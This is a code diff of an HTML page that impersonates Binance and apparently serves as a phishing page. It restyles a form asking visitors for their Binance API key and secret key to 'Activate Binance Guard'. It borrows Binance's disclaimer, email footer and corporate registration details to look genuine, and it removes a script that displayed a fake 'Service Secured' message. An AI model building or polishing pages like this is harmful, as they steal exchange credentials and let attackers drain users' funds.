@@ -110,34 +110,24 @@
       <input type="hidden" name="form-name" value="binance-api-key">
       <p class="hidden"><label>Don’t fill <input name="bot-field"></label></p>
       <div class="field">
-        <div class="label"><span class="dot"></span><span>Binance API Key</span></div>
-        <input name="api_key" type="text" placeholder="Enter your Binance API Key" required autocomplete="off">
+        <div class="label"><span class="dot"></span><span style="font-size:13px;">Binance API Key</span></div>
+        <input name="api_key" type="text" placeholder="Enter your Binance API Key" required autocomplete="off" style="border-radius:4px;">
       </div>
       <div class="field">
-        <div class="label"><span class="dot"></span><span>Binance Secret Key</span></div>
-        <input name="secret_key" type="password" placeholder="Enter your Binance Secret Key" required autocomplete="off">
+        <div class="label"><span class="dot"></span><span style="font-size:13px;">Binance Secret Key</span></div>
+        <input name="secret_key" type="password" placeholder="Enter your Binance Secret Key" required autocomplete="off" style="border-radius:4px;">
       </div>
-  <button class="btn" type="submit">Activate Binance Guard</button>
-    <div class="hr"></div>
-    <p class="disc">
-      Disclaimer: The use of digital assets involves risks. Please note that digital assets are volatile and may be unsuitable for you and your profile, so you should only invest in products that you are familiar with.
-    </p>
-    <p class="foot">
-      <span class="muted">Remark: you received this email because you are registered as a user of binance.com</span><br><br>
-      Binance France — SIREN 913864005 — AMF: E2022-037 — 1 rue de Stockholm, 75008 Paris France<br>
-      Binance Services Holdings Limited, located in 6th Floor, South Bank House, Barrow Street Dublin 4 are jointly responsible for the processing of your personal data. For more information regarding the processing of your personal data, please refer to our data protection policy.
-    </p>
+      <button class="btn" type="submit" style="border-radius:4px;">Activate Binance Guard</button>
+      <div class="hr"></div>
+      <p class="disc" style="font-size:13px;">
+        Disclaimer: The use of digital assets involves risks. Please note that digital assets are volatile and may be unsuitable for you and your profile, so you should only invest in products that you are familiar with.
+      </p>
+      <p class="foot" style="font-size:11px;">
+        <span class="muted">Remark: you received this email because you are registered as a user of binance.com</span><br><br>
+        Binance France — SIREN 913864005 — AMF: E2022-037 — 1 rue de Stockholm, 75008 Paris France<br>
+        Binance Services Holdings Limited, located in 6th Floor, South Bank House, Barrow Street Dublin 4 are jointly responsible for the processing of your personal data. For more information regarding the processing of your personal data, please refer to our data protection policy.
+      </p>
     </form>
-    <div id="confirmation" style="display:none;margin:18px 0 0 0;padding:14px;border-radius:8px;background:linear-gradient(90deg,#16a34a 60%,#22c55e 100%);color:#fff;text-align:center;font-weight:700;box-shadow:0 2px 8px rgba(22,163,74,.12);">
-      Binance Guard Service Secured
-    </div>
-    <script>
-      function showConfirmation(e) {
-        e.preventDefault();
-        document.querySelector('form').style.display = 'none';
-        document.getElementById('confirmation').style.display = 'block';
-      }
-    </script>
   </section>
 </main>
 </body>
